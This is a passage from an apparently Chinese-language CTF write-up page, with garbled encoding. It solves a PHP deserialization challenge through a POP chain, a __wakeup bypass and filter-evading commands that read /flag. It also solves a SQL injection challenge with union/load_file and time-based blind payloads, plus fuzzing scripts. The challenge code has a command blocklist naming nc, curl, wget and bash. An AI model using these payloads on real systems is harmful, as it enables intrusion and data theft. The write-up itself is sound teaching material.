class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have fun&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">flag in /flag</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆæ˜¯ä»æœ‰ system çš„å‡½æ•°å¼€å§‹çœ‹ï¼Œé¦–å…ˆå°±æ˜¯éœ€è¦æœ‰èƒ½å¤Ÿè§¦å‘ class02 <code>__involk</code>  çš„åœ°æ–¹ï¼Œè¿™é‡Œå°±éœ€è¦æ‰¾åˆ°å…¶ä»–çš„åŠ¨æ€å‡½æ•°è°ƒç”¨çš„ç‚¹ï¼Œåœ¨ class00 çš„ <code>__set</code>  å¤„æ‰¾åˆ°äº†ï¼Œä¹‹ååœ¨ class01 çš„ <code>__tostring</code>  é‡Œæ‰¾åˆ°äº†ï¼Œä¹Ÿå°±æ˜¯ <code>$this-&gt;cls-&gt;str1 = $this-&gt;str3;</code> ï¼Œä¸è¿‡ï¼Œè¿™é‡Œéœ€è¦å°† cls ä¿®æ”¹æˆ class00 æ‰è¡Œï¼Œä¹‹åå†å¾€ä¸Šï¼Œæœ‰ä¸ªæ¯”è¾ƒï¼Œ <code>if ($this-&gt;temp === 1)</code>  è¿™é‡Œéœ€è¦æƒ³åŠæ³•è®©è¡¨è¾¾å¼ä¸º Trueï¼Œåˆšå¥½ï¼Œclass00 é‡Œé¢çš„ <code>__call</code>  å¯ä»¥è¿”å› 1ï¼Œå¹¶ä¸” <code>$this-&gt;temp = $this-&gt;cls-&gt;func1();</code>  è°ƒç”¨äº† cls é‡Œé¢ä¸å­˜åœ¨çš„æ–¹æ³•ï¼›ä¹‹åå¾€å›çœ‹ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰¾åˆ° wakeup æˆ–è€… destruct ç­‰ç­‰é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥è¿˜å¾—ç»§ç»­æ‰¾ï¼Œ <code>__tostring</code>  èƒ½å¤Ÿè§¦å‘çš„ç‚¹ï¼Œçœ‹åˆ° User ç±»ï¼Œé‡Œé¢æ‰¾åˆ°äº† <code>echo $this-&gt;msg;</code>  è¿™é‡Œçš„ msg æ˜¯å¯æ§çš„ï¼Œåˆšå¥½ï¼Œå¯ä»¥ç”¨æ¥è¾“å‡ºæ“ä½œï¼Œä¹Ÿå°±æ˜¯æŠŠç±»å½“ä½œå­—ç¬¦ä¸²æ“ä½œï¼Œä¹‹åå°±æ˜¯æƒ³åŠæ³•ç»•è¿‡ check å‡½æ•°å³å¯ï¼Œç»•è¿‡ <code>__wakeup</code>  å³å¯æ‰“å‡ºç»„åˆæ‹³ï¼š</p><p>â€‹é¦–å…ˆæ˜¯è·å¾—å‰ç½® payloadï¼Œä¹Ÿå°±æ˜¯åºåˆ—åŒ–é“¾å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;token = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;msg = <span class="keyword">new</span> <span class="title function_ invoke__">class01</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;cls = <span class="keyword">new</span> <span class="title function_ invoke__">class00</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;str3 = <span class="keyword">new</span> <span class="title function_ invoke__">class02</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;str3-&gt;payload = <span class="string">&quot;payload&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åï¼Œé€šè¿‡ä¿¡æ¯æœé›†ï¼Œå‘ç°äº† PHP ç‰ˆæœ¬æ˜¯ 5.4ï¼Œå­˜åœ¨æˆå‘˜ä¸ªæ•°ä¸åŒç»•è¿‡ <code>__wakeup</code>  çš„æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥å¹²ï¼Œå°†ä¸Šé¢çš„ payload ä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶å base64 ç¼–ç å³å¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ly9POjQ6IlVzZXIiOjY6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6NjoiMTIzNDU2IjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjtzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjozOntzOjQ6InRlbXAiO2k6MDtzOjQ6InN0cjMiO086NzoiY2xhc3MwMiI6MTp7czo3OiJwYXlsb2FkIjtzOjc6InBheWxvYWQiO31zOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9fX0=</span></span><br></pre></td></tr></table></figure><p>â€‹å¥½äº†ï¼Œä¹‹åå°±æ˜¯è¯»å– flag äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123; </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ï¼Œè¿˜ç®—å¥½ï¼ˆä¸»è¦æ˜¯å› ä¸ºè¿™é‡Œä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨ä¸€äº›æ‰‹æ³•ç»•ä¸è¿‡ç©ºæ ¼ï¼Œæˆ‘å°±æ²¡æœ‰ç®¡äº†ï¼Œæ¯•ç«Ÿ $ æ²¡äº†ï¼Œå¤šä¸ªé‡å®šå‘ç¬¦ä¹Ÿæœ‰é—®é¢˜ï¼Œè¿‡ä¸äº† /dev/nullï¼‰ï¼Œå¯»å¸¸çš„ lsï¼Œdir éƒ½è¢«è¿‡æ»¤äº†ï¼Œå¤§å°äºç¬¦å·å’Œä¸­æ‹¬å·æ²¡æœ‰è¿‡ï¼Œé€šé…ç¬¦è¿‡æ»¤äº†ï¼Œåæ–œæ ä¹Ÿè¿‡æ»¤äº†ï¼Œé‚£å°±ç”¨ä¸­æ‹¬å·å’Œæ–‡ä»¶åæ¥ç»•è¿‡å§ï¼Œå…ˆæ¥ä¸€æ³¢ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload:/bin/l[s] ||</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:12:&quot;/bin/l[s] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoxMjoiL2Jpbi9sW3NdIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19</span></span><br></pre></td></tr></table></figure><p>â€‹æˆåŠŸæ‰“å‡ºç»„åˆæ‹³ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ— å›æ˜¾çš„ä¸€ä¸ªç»•è¿‡ï¼Œéœ€è¦ç”¨ || æ¥ç»•è¿‡ <code>&gt;/dev/null 2&gt;&amp;1</code> ï¼ŒåŸç†å°±æ˜¯è®©è¿™ä¸€ä¸²å•ç‹¬æ‰§è¡Œæˆ–è€…ä¸æ‰§è¡Œå³å¯ã€‚</p><p>â€‹ä¹‹åå°±æ˜¯è¯»å– flag äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///bin/ca[t] /fla[g] ||</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:21:&quot;/bin/ca[t] /fla[g] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyMToiL2Jpbi9jYVt0XSAvZmxhW2ddIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19Cg==</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè¯»å–æºç æ‰¾åˆ°äº† flag</p><h3 id="baby_sql"><a class="markdownIt-Anchor" href="#baby_sql">#</a> baby_sqlï¼š</h3><h4 id="éé¢„æœŸ"><a class="markdownIt-Anchor" href="#éé¢„æœŸ">#</a> éé¢„æœŸï¼š</h4><p>â€‹index é¡µé¢çš„ password å­˜åœ¨ sql æ³¨å…¥ï¼Œæœ¬æ¥æƒ³å‡ºå¼±å¯†ç çš„ï¼Œç»“æœæ²¡æ³¨æ„åˆ°è¿™é‡Œä¹Ÿèƒ½æ‰“æ³¨å…¥ï¼Œè¢« sqlmap ä¸€æŠŠæ¢­äº†ã€‚</p><p>â€‹é¦–å…ˆä¸‡èƒ½å¯†ç ç™»é™†ä¹‹åï¼Œç”¨ group by ç¡®å®šå­—æ®µæ•°ï¼Œæ¥ç€è¿™é‡Œ å¯ä»¥ç”¨ loadfile æ¥å¿«é€Ÿå‡º flagã€‚å½“ç„¶ï¼Œè¿™æ˜¯å»ºç«‹åœ¨ flag çš„æ–‡ä»¶ ç¡®å®åœ¨æ ¹ç›®å½•å¹¶ä¸”åå­—ç¡®å®æ˜¯ flagï¼Œè€Œä¸”å­˜åœ¨å…¶ä»–é™åˆ¶ï¼Œæˆ åŠŸé€ƒè¯¾çš„å¯èƒ½æ€§å¹¶ä¸æ˜¯å¾ˆå¤§ï¼Œè¿™é‡Œå› ä¸ºåŒæ—¶å­˜åœ¨ä¸¤ä¸ªåŸå› å¯¼è‡´äº†éé¢„æœŸï¼Œä¸€æ˜¯å› ä¸ºé¢˜ç›®éƒ¨ç½²åˆ°å¹³å°çš„æ—¶å€™æœ‰ä¸ªå‚æ•°å¿˜è®°åˆ äº†ï¼Œè¿™ä¸ªå‚æ•°å¯¼è‡´äº† flag ä¼šè¢«å†™å…¥ /flagï¼Œå¦å¤–ï¼Œé¢˜ç›®æµ‹è¯•çš„æ—¶å€™ï¼Œvar_dump æˆ‘å¿˜è®°åˆ äº†ï¼Œä¼šæŠŠä¿¡æ¯ç»™ä¸€åŒæ‰“å°å‡ºæ¥ï¼Œå°±å¯¼è‡´äº†è¿™ä¸ªé¢˜æœ‰å›æ˜¾ï¼Œæˆ‘çš„é”…å•Šã€‚</p><p><code>payloadï¼š-1'/**/union/**/select/**/1,1,load_file('/flag')#</code></p><h4 id="é¢„æœŸè§£"><a class="markdownIt-Anchor" href="#é¢„æœŸè§£">#</a> é¢„æœŸè§£</h4><p>â€‹é¦–å…ˆï¼Œindex æ˜¯ä¸€ä¸ªç™»é™†æ¡†ï¼Œæ’é™¤å¼±å¯†ç çš„å¯èƒ½ï¼Œåˆ«é—®ä¸ºä»€ä¹ˆï¼Œå› ä¸ºçˆ†ä¸å‡ºæ¥ï¼Œç›´æ¥è€ƒè™‘ä¸‡èƒ½å¯†ç ï¼Œæ ¹æ®å¯†ç æ˜¯å­˜åœ¨å­—ç¬¦å’Œå­—æ¯æ•°å­—çš„ï¼Œæ‰€ä»¥é¢„æµ‹ä¸ºå­—ç¬¦å‹ï¼Œç›´æ¥ <code>1' or 1=1#</code> å³å¯</p><p>â€‹ç¬¬äºŒé¡µæœ‰ä¸ªè«åå…¶å¦™çš„æŠ¥é”™ï¼Œä¸ç®¡ã€‚</p><p>â€‹æ‹¿åˆ°è¿™ä¸ªé¢˜çš„ç¬¬ä¸€æ—¶é—´ fuzz ä¸€ä¸‹è¿‡æ»¤ï¼Œå…ˆåšå‡ ä¸ªå°è¯•ï¼Œé¦–å…ˆï¼Œæˆ‘æ²¡æ£é¼“è¿‡è¿™ä¸ªé¢˜èƒ½å¦åšå¸ƒå°”ç›²æ³¨ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šæ—¶é—´ç›²æ³¨çš„æ‰‹æ³•ã€‚éšä¾¿å†™å…¥ä¸€äº›ï¼Œè§¦å‘è¿‡æ»¤ï¼Œå‘ç°æœ‰å¼‚å¸¸è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯ NO,Hackerï¼Œå¥½äº†ï¼Œå¯ä»¥è·‘å­—å…¸äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">lst = [<span class="string">&quot;select&quot;</span>,</span><br><span class="line"><span class="string">&quot;update&quot;</span>,</span><br><span class="line"><span class="string">&quot;from&quot;</span>,</span><br><span class="line"><span class="string">&quot;where&quot;</span>,</span><br><span class="line"><span class="string">&quot;union&quot;</span>,</span><br><span class="line"><span class="string">&quot;like&quot;</span>,</span><br><span class="line"><span class="string">&quot;and&quot;</span>,</span><br><span class="line"><span class="string">&quot;delete&quot;</span>,</span><br><span class="line"><span class="string">&quot;drop&quot;</span>,</span><br><span class="line"><span class="string">&quot;insert&quot;</span>,</span><br><span class="line"><span class="string">&quot;join&quot;</span>,</span><br><span class="line"><span class="string">&quot;hex&quot;</span>,</span><br><span class="line"><span class="string">&quot;or&quot;</span>,</span><br><span class="line"><span class="string">&quot;if&quot;</span>,</span><br><span class="line"><span class="string">&quot;xor&quot;</span>,</span><br><span class="line"><span class="string">&quot;not&quot;</span>,</span><br><span class="line"><span class="string">&quot;table_name&quot;</span>,</span><br><span class="line"><span class="string">&quot;CHAR&quot;</span>,</span><br><span class="line"><span class="string">&quot;group_concat&quot;</span>,</span><br><span class="line"><span class="string">&quot;information&quot;</span>,</span><br><span class="line"><span class="string">&quot;schema&quot;</span>,</span><br><span class="line"><span class="string">&quot;columns&quot;</span>,</span><br><span class="line"><span class="string">&quot;regexp&quot;</span>,</span><br><span class="line"><span class="string">&quot;greatest&quot;</span>,</span><br><span class="line"><span class="string">&quot;ascii&quot;</span>,</span><br><span class="line"><span class="string">&quot;substr&quot;</span>,</span><br><span class="line"><span class="string">&quot;strcmp&quot;</span>,</span><br><span class="line"><span class="string">&quot;in&quot;</span>,</span><br><span class="line"><span class="string">&quot;between&quot;</span>,</span><br><span class="line"><span class="string">&quot;database&quot;</span>,</span><br><span class="line"><span class="string">&quot;offset&quot;</span>,</span><br><span class="line"><span class="string">&quot;limit&quot;</span>,</span><br><span class="line"><span class="string">&quot;sleep&quot;</span>,</span><br><span class="line"><span class="string">&quot;benchmark&quot;</span>,</span><br><span class="line"><span class="string">&quot;bin&quot;</span>,</span><br><span class="line"><span class="string">&quot;mid&quot;</span>,</span><br><span class="line"><span class="string">&quot;substring&quot;</span>,</span><br><span class="line"><span class="string">&quot;updatexml&quot;</span>,</span><br><span class="line"><span class="string">&quot; &quot;</span>,</span><br><span class="line"><span class="string">&quot;--&quot;</span>,</span><br><span class="line"><span class="string">&quot;\&#x27;&quot;</span>,</span><br><span class="line"><span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"><span class="string">&quot;()&quot;</span>,</span><br><span class="line"><span class="string">&quot;-&quot;</span>,</span><br><span class="line"><span class="string">&quot;+&quot;</span>,</span><br><span class="line"><span class="string">&quot;#&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&quot;</span>,</span><br><span class="line"><span class="string">&quot;/&quot;</span>,</span><br><span class="line"><span class="string">&quot;!&quot;</span>,</span><br><span class="line"><span class="string">&quot;,&quot;</span>,</span><br><span class="line"><span class="string">&quot;`&quot;</span>,</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span>,</span><br><span class="line"><span class="string">&quot;|&quot;</span>,</span><br><span class="line"><span class="string">&quot;;&quot;</span>,</span><br><span class="line"><span class="string">&quot;^&quot;</span>,</span><br><span class="line"><span class="string">&quot;%&quot;</span>,</span><br><span class="line"><span class="string">&quot;@&quot;</span>,</span><br><span class="line"><span class="string">&quot;=&quot;</span>,</span><br><span class="line"><span class="string">&quot;&lt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;&quot;</span>]</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;NO,Hacker&quot;</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/worker.php&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:i&#125;</span><br><span class="line">    rsp = post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> temp <span class="keyword">in</span> rsp.text:</span><br><span class="line">        a.append(i)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[&#x27;update&#x27;, &#x27;delete&#x27;, &#x27;drop&#x27;, &#x27;insert&#x27;, &#x27;join&#x27;, &#x27;hex&#x27;, &#x27;CHAR&#x27;, &#x27;information&#x27;, &#x27;updatexml&#x27;, &#x27; &#x27;, &#x27;--&#x27;, &#x27;=&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;]</span></span><br></pre></td></tr></table></figure><p>â€‹æœ€åè·‘å‡ºæ¥å’Œæˆ‘é¢„è®¡çš„å·®ä¸å¤šï¼Œç„¶åå› ä¸ºåˆæ˜¯å¯ä»¥è¾“å…¥å­—ç¬¦ç­‰ç­‰ï¼Œæ¨æµ‹è¿˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œéšæœºæ„é€ ä¸€ä¸‹ payload çœ‹çœ‹èƒ½å¦æˆåŠŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://154.64.254.169:33161/worker.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;111&#x27;/**/or/**/if((select/**/database())/**/like/**/database(),sleep(5),sleep(0))#&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>:payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">istime</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = post(url,data=data,timeout=<span 